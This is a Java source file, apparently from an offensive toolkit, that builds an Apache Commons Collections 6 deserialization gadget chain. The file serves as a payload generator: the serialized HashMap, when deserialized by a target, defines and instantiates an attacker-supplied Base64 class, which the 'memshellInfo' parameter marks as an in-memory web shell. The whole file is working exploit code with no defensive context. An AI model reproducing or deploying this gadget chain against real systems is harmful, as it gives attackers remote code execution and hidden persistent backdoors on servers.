package com.chave.gadget;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import org.mozilla.javascript.DefiningClassLoader;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.util.Base64;
import java.util.HashMap;
import java.util.HashSet;

public class CommonsCollections6 {
    public static Object getObject(String[] memshellInfo) throws IllegalAccessException, NoSuchFieldException {
        byte[] code = Base64.getDecoder().decode(memshellInfo[1]);

        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(DefiningClassLoader.class),
                new InvokerTransformer("getDeclaredConstructor", new Class[]{Class[].class}, new Object[]{new Class[0]}),
                new InvokerTransformer("newInstance", new Class[]{Object[].class}, new Object[]{new Object[0]}),
                new InvokerTransformer("defineClass", new Class[]{String.class, byte[].class}, new Object[]{memshellInfo[0], code}),
                new InvokerTransformer("getDeclaredConstructor", new Class[]{Class[].class}, new Object[]{new Class[0]}),
                new InvokerTransformer("newInstance", new Class[]{Object[].class}, new Object[]{new Object[0]}),
                new ConstantTransformer(new HashSet())
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);

        LazyMap lazyMap = (LazyMap) LazyMap.decorate(new HashMap(), chainedTransformer);

        TiedMapEntry tiedMapEntry = new TiedMapEntry(new HashMap(), "1");
        tiedMapEntry.hashCode();

        HashMap hashMap = new HashMap();
        hashMap.put(tiedMapEntry, null);

        Field mapField = TiedMapEntry.class.getDeclaredField("map");
        mapField.setAccessible(true);
        mapField.set(tiedMapEntry, lazyMap);

        return hashMap;
    }
}
